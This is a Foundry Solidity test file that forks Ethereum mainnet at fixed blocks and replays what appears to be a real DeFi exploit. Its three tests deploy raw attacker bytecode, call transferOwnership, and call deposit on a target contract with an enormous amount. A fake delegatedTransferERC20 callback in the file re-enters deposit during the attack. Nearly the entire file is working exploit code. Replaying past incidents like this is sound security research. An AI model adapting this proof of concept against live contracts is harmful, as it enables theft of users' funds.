// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f
// https://etherscan.io/address/0x8Efab89b497b887CDaA2FB08ff71e4b3827774B2

interface I {
    function deposit(uint256, address, address) external payable;
}

contract X10c5 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f");
    }

    address constant xc9f2 = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;

    uint256 t_delegatedTransferERC20 = 0;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 13849006); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xbe65cb0dd9f4619939cfeb56b3ef3a996e2b028b93fd66443abfa06d6df8e58d));

        // https://explorer.phalcon.xyz/tx/eth/0xbe65cb0dd9f4619939cfeb56b3ef3a996e2b028b93fd66443abfa06d6df8e58d
        this.xbe65cb0d();
        // https://explorer.phalcon.xyz/tx/eth/0x27f2210536553392cf180c0b37055b3dc92094a5d585d7d2a51f790c9145e47c
        this.x27f22105();
        // https://explorer.phalcon.xyz/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f
        x4a0b0c38();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 13848981); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xbe65cb0dd9f4619939cfeb56b3ef3a996e2b028b93fd66443abfa06d6df8e58d
        this.xbe65cb0d();
        vm.warp(1640095967);
        vm.roll(13848982);
        // https://explorer.phalcon.xyz/tx/eth/0x27f2210536553392cf180c0b37055b3dc92094a5d585d7d2a51f790c9145e47c
        this.x27f22105();
        vm.warp(1640096295);
        vm.roll(13849006);
        // https://explorer.phalcon.xyz/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f
        x4a0b0c38();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 13849006); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1640096295);
        vm.roll(13849007);
        // https://explorer.phalcon.xyz/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f
        vm.deal(RECEIVER, 10 ether);
        x4a0b0c38();
    }

    function x27f22105() public {
        X10c5(payable(r)).transferOwnership(r);
    }

    function xbe65cb0d() public {
        _constructor_();
    }

    function x4a0b0c38() public {
        I(xc9f2).deposit(100000000000000000000000000, r, tx.origin);
    }

    function transferOwnership(address) public {}

    function delegatedTransferERC20(address, address, uint256) public {
        t_delegatedTransferERC20++;

        if (t_delegatedTransferERC20 == 1) {
            I(xc9f2).deposit(100000000000000000000000000, r, tx.origin);
            return;
        }
        if (t_delegatedTransferERC20 == 2) {
            return;
        }
    }

    function _constructor_() public {
        bytes memory rt =
            hex"608060405234801561001057600080fd5b50600436106100935760003560e01c8063715018a611610066578063715018a6146101625780638da5cb5b1461016c5780638f32d59b146101a0578063f2fde38b146101c0578063f851a4401461020457610093565b806306661abd1461009857806316f0115b146100b65780632e88fb97146100ea5780634a0b0c3814610158575b600080fd5b6100a0610238565b6040518082815260200191505060405180910390f35b6100be61023e565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101566004803603606081101561010057600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610264565b005b61016061028e565b005b61016a6103aa565b005b610174610461565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101a861048a565b60405180821515815260200191505060405180910390f35b610202600480360360208110156101d657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506104e1565b005b61020c6104fe565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60025481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6002600081548092919060010191905055506002805410156102895761028861028e565b5b505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e2d29846a52b7d2dcc80cd2e400000030600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518463ffffffff1660e01b8152600401808481526020018373ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1681526020019350505050602060405180830381600087803b15801561036c57600080fd5b505af1158015610380573d6000803e3d6000fd5b505050506040513d602081101561039657600080fd5b810190808051906020019092919050505050565b6103b261048a565b6103bb57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167ff8df31144d9c2f0f6b59d69b8b98abd5459d07f2742c4df920b25aae33c6482060405160405180910390a260008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614905090565b6104e961048a565b6104f257600080fd5b6104fb81610524565b50565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141561055e57600080fd5b8073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505056fea26469706673582212202d52f0de276f4f2ab12d382d4e75a5b3fb46d7c98bba570226ee77d23139686a64736f6c63430007060033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function owner() public {
        bytes memory rt = abi.encodePacked(abi.encode(address(r)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}
